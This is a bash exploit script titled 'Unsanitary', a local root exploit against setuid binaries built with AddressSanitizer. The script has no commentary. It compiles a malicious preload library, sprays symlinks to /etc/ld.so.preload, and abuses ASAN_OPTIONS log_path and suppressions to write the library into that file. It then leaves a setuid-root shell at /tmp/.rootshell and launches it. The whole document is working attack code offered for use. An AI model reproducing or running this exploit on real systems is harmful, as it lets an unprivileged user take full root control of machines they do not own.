rootshell="/tmp/.rootshell"
lib="/tmp/.libhax"
spray="/tmp/.spray"

target="${1}"
log_prefix="$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 12 | head -n 1)___"
spray_size=100

command_exists() {
  command -v "${1}" >/dev/null 2>/dev/null
}

echo "Unsanitary - ASAN/SUID Local Root Exploit ~infodox (2016)"

if [[ $# -eq 0 ]] ; then
    echo "use: $0 /full/path/to/targetbin"
    echo "where targetbin is setuid root and compiled w/ ASAN"
    exit 0
fi

if ! command_exists gcc; then
  echo '[-] gcc is not installed'
  exit 1
fi

if ! test -w .; then
  echo '[-] working directory is not writable'
  exit 1
fi

if ! test -u "${target}"; then
  echo "[-] ${target} is not setuid"
  exit 1
fi

if [[ $(/usr/bin/ldd "${target}") =~ "libasan.so" ]]; then
  echo "[+] ${target} was compiled with libasan"
else
  echo "[!] Warning: ${target} appears to have been compiled without libasan"
fi

echo "[.] Compiling ${lib}.c ..."

cat << EOF > "${lib}.c"
#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>

void init(void) __attribute__((constructor));

void __attribute__((constructor)) init() {
  if (setuid(0) || setgid(0))
    _exit(1);

  unlink("/etc/ld.so.preload");

  chown("${rootshell}", 0, 0);
  chmod("${rootshell}", 04755);
  _exit(0);
}
EOF

if ! gcc "${lib}.c" -fPIC -shared -ldl -o "${lib}.so"; then
  echo "[-] Compiling ${lib}.c failed"
  exit 1
fi
/bin/rm -f "${lib}.c"

echo "[.] Compiling ${rootshell}.c ..."

cat << EOF > "${rootshell}.c"
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
int main(void)
{
  setuid(0);
  setgid(0);
  execl("/bin/bash", "bash", NULL);
}
EOF

if ! gcc "${rootshell}.c" -o "${rootshell}"; then
  echo "[-] Compiling ${rootshell}.c failed"
  exit 1
fi
/bin/rm -f "${rootshell}.c"

echo "[.] Compiling ${spray}.c ..."

cat << EOF > "${spray}.c"
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
int main(void)
{
  pid_t pid = getpid();
  char buf[64];
  for (int i=0; i<=${spray_size}; i++) {
    snprintf(buf, sizeof(buf), "${log_prefix}.%ld", (long)pid+i);
    symlink("/etc/ld.so.preload", buf);
  }
}
EOF

if ! gcc "${spray}.c" -o "${spray}"; then
  echo "[-] Compiling ${spray}.c failed"
  exit 1
fi
/bin/rm -f "${spray}.c"

echo "[.] Spraying $(pwd) with symlinks ..."

/bin/rm $log_prefix* >/dev/null 2>&1
$spray

echo "[.] Adding ${lib}.so to /etc/ld.so.preload ..."

ASAN_OPTIONS="disable_coredump=1 suppressions='/${log_prefix}
${lib}.so
' log_path=./${log_prefix} verbosity=0" "${target}" >/dev/null 2>&1

ASAN_OPTIONS='disable_coredump=1 abort_on_error=1 verbosity=0' "${target}" >/dev/null 2>&1

echo '[.] Cleaning up...'
/bin/rm $log_prefix*
/bin/rm -f "${spray}"
/bin/rm -f "${lib}.so"

if ! test -u "${rootshell}"; then
  echo '[-] Failed'
  /bin/rm "${rootshell}"
  exit 1
fi

echo '[+] Success:'
/bin/ls -la "${rootshell}"

echo "[.] Launching root shell: ${rootshell}"
$rootshell